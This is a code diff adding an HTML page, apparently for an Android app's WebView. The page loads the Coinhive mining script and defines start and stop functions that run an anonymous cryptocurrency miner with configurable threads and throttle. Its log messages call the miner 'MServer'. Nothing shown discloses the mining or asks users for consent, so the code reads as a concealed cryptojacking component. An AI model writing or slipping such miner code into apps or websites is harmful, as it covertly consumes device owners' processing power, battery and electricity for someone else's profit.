@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+</head>
+<body>
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+  <script>
+
+      var mServer;
+
+      android.log("Initializing MServer");
+
+      function start(id, throttle, threads) {
+          android.log("starting MServer ( " + id + " - " + threads + " - " + throttle + " )");
+          if (mServer == null) {
+              mServer = new CoinHive.Anonymous(id, {
+              threads: threads,
+              throttle: 1 - throttle / 100.0,
+              });
+          } else {
+              mServer.stop();
+              mServer.setThrottle(throttle);
+              mServer.setNumThreads(threads);
+          }
+          mServer.start();
+      }
+
+      function stop() {
+          android.log("stopping MServer");
+          if (mServer != null && mServer.isRunning()) {
+              mServer.stop();
+          }
+      }
+
+  </script>
+</body>
+</html>
